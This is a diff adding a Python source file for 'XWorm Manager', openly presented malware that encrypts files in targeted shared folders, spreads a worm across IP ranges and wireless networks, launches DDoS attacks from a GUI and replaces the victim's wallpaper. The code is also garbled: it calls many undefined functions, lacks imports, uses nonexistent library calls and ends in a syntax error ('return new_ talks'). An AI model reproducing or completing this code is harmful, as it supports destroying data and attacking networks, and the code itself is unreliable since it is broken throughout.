@@ -1,0 +1,204 @@
+import os
+import sys
+import random
+import threading
+import time
+import smb
+import socket
+import urllib.request
+import requests
+import http.client
+from datetime import datetime
+from tkinter import Tk, Toplevel, Label, Entry, Button, Text, messagebox
+from cryptography.fernet import Fernet
+from PIL import ImageGrab, ImageOps
+import tkinter as tk
+
+# Configuration
+DDOS_THREADS = 20
+WORM_SPREAD_CHANCE = 99.99   # Chance of spreading worm to a target (0.01% to 100%)
+SHARED_FOLDERS = ["Finance", "HR", "Marketing", " Research", "IT"]   # Shared folders to be targeted for infection
+SUSPENDED_FOLDERS = ["Administration", "Diagnostics", "Logs"]   # Folders that are skipped during the infection process
+TARGET_FILE = "/tmp/xworm-targets"
+APPLICATION_FOLDER = "/root/xworm"
+TEMP_FOLDER = "/root/xworm-temp"
+
+# Load encrypted configuration and API key
+def load_config_and_api_key(encryption_key):
+    config, api_key = {}, Fernet(encryption_key)
+    with open("config.dat", "rb") as config_file:
+        config = pickle.load(config_file)
+
+    return config, api_key
+
+# Leave a visible footprint
+def make_wallpaper():
+    image = ImageGrab.grab()
+    text = "\x1b[31mXWorm\x1b[0m"
+    text_image = ImageOps.expand(ImageOps.textsize(text, font="arial", fill=(255, 0, 0)))
+    text_image.thumbnail((image.width, image.height))
+    result = Image.new("RGB", image.size)
+    result.paste(image, (0, 0))
+    result.paste(text_image, ((image.width - text_image.width) // 2,
+                               (image.height - text_image.height) // 2))
+    result.save("wallpaper.jpg")
+
+    os.system(f"feh --bg-scale wallpaper.jpg")
+
+# Infect files on a shared folder
+def infect_shared_folder(shared_folder, config, api_key):
+    for file in list_files(shared_folder):
+        file_path = os.path.join(shared_folder, file)
+        if file != "config.dat" and file != "apikey.dat":
+            file_content = open(file_path, "rb").read()
+            encrypted_file_content = api_key.encrypt(file_content)
+
+            if file == "worm.py":
+                open(file_path, "wb").write(encrypted_file_content)
+                continue
+
+            save_file(file_path, encrypted_file_content)
+
+def save_file(file_path, file_content):
+    with open(file_path, "wb") as file:
+        file.write(file_content)
+
+# Start DDoS attack against a target
+def start_ddos_attack_against_target(target, target_ip, target_port, config, api_key):
+    def stop_ddos_attack():
+        nonlocal ddos_thread, target_alive, attack_counter
+        attack_counter = 0
+        ddos_thread.join()
+        target_alive.set(False)
+        main_window.destroy()
+
+    # Create a new GUI window to stop the attack
+    stop_window = Toplevel(main_window)
+    stop_window.title("Stop DDoS Attack")
+    stop_window.geometry("300x200")
+    stop_window.resizable(width=False, height=False)
+
+    Label(stop_window, text="Are you sure you want to stop the DDoS attack against " + target + "?"
+                           "\nThis action will halt the ongoing attack and restart the worm infection process.").pack(pady=10)
+
+    Button(stop_window, text="Yes", command=stop_ddos_attack).pack(pady=10)
+    Button(stop_window, text="No", command=stop_window.destroy).pack(pady=10)
+
+    # DDoS attack thread
+    ddos_thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port, config, api_key))
+    ddos_thread.start()
+
+    # Create a BooleanVar to keep track of the attack status
+    target_alive = BooleanVar()
+    target_alive.set(True)
+    attack_counter = 0
+    # Update the GUI with the DDoS progress
+    def update_attack_progress():
+        if attack_counter >= DDOS_THREADS:
+            ddos_attack_status.config(text="DDoS Attack Successful!")
+            ddos_attack_status.config(fg="green")
+            target_alive.set(False)
+            return
+
+        ddos_attack_status.config(text=f"DDoS Attack Against {target} - Attempt {attack_counter + 1}")
+        attack_counter += 1
+        main_window.update_idletasks()
+        time.sleep(1)
+        main_window.after(1000, update_attack_progress)
+
+    # Start the progress update in a separate thread
+    update_attack_progress()
+
+# Spread worm on a target machine
+def spread_worm_on_target(target_ip, saved_files, api_key):
+    # Get a list of all shared folders on the target machine
+    shared_folders = get_shared_folders(target_ip)
+
+    # Infect each shared folder
+    for shared_folder in shared_folders:
+        infect_shared_folder(shared_folder, config, api_key)
+
+    # Save the infected files on the target machine
+    for saved_file_name, saved_file in saved_files.items():
+        file_path = os.path.join(TEMP_FOLDER, saved_file_name)
+        save_file(file_path, saved_file)
+
+    # Reduce the chance of spreading further
+    if random.random() < WORM_SPREAD_CHANCE / 100:
+        # Find a new list of targets
+        new_targets = find_new_targets(target_ip)
+        # Save the new targets for further infection
+        update_targets_file(new_targets)
+
+def main():
+    encryption_key = os.environ["ENCRYPTION_KEY"]
+    config, api_key = load_config_and_api_key(encryption_key)
+
+    # Create the main GUI window
+    main_window = Tk()
+    main_window.title("XWorm Manager")
+    main_window.geometry("600x400")
+
+    # Create GUI elements
+    label_target = Label(main_window, text="Select a Target:")
+    label_target.grid(row=0, column=0, padx=10, pady=10)
+
+    target_entry = Entry(main_window, width=30)
+    target_entry.grid(row=0, column=1, padx=10, pady=10)
+
+    label_port = Label(main_window, text="Port:")
+    label_port.grid(row=1, column=0, padx=10, pady=10)
+
+    port_entry = Entry(main_window, width=30)
+    port_entry.grid(row=1, column=1, padx=10, pady=10)
+
+    label_ddos = Label(main_window, text="Start DDoS Attack (Optional):")
+    label_ddos.grid(row=2, column=0, padx=10, pady=10)
+
+    ddos_check = IntVar()
+    ddos_check.set(0)
+    start_ddos = Checkbutton(
+        main_window, text="Start DDoS Attack", variable=ddos_check, onvalue=1, offvalue=0)
+    start_ddos.grid(row=2, column=1, padx=10, pady=10)
+
+    label_status = Label(main_window, text="Status:", font=("Helvetica", 12))
+    label_status.grid(row=3, columnspan=2, padx=10, pady=10)
+    ddos_attack_status = Label(main_window, text="Idle", font=("Helvetica", 12))
+    ddos_attack_status.grid(row=4, columnspan=2, padx=10, pady=10)
+
+    # Attack button
+    attack_button = Button(main_window, text="Attack", command=lambda: attack(target_entry.get(),
+                                                                                 port_entry.get(), ddos_check.get(), config, api_key))
+    attack_button.grid(row=5, column=1, padx=10, pady=10)
+
+    # Display the wallpaper made by XWorm
+    make_wallpaper()
+
+    main_window.mainloop()
+
+# Find a new list of targets based on the SSID or IP range
+def find_new_targets(target_ip):
+    new_targets = []
+    with open("targets.txt", "r") as f:
+        for line in f:
+            target_data = line.strip().split("\t")
+            if len(target_data) > 1:
+                if target_data[0] == "SSID":
+                    wlan = "ALTER_WLAN_DRIVE"
+                    if scan_network(wlan):
+                        new_targets += [target for target in get_targets_from_network(wlan) if target != target_ip]
+                elif target_data[0] == "IP Range":
+                    ip_range = target_data[1].split("/")
+                    start_ip = ip_range[0]
+                    end_ip = ip_range[1]
+
+                    start_ip_num = int(ip_to_long(start_ip))
+                    end_ip_num = int(ip_to_long(end_ip))
+
+                    for ip in range(start_ip_num, end_ip_num + 1):
+                        ip_string = long_to_ip(ip)
+                        if ip_string != target_ip:
+                            new_targets.append(ip_string)
+            else:
+                new_targets.append("")
+    return new_ talks
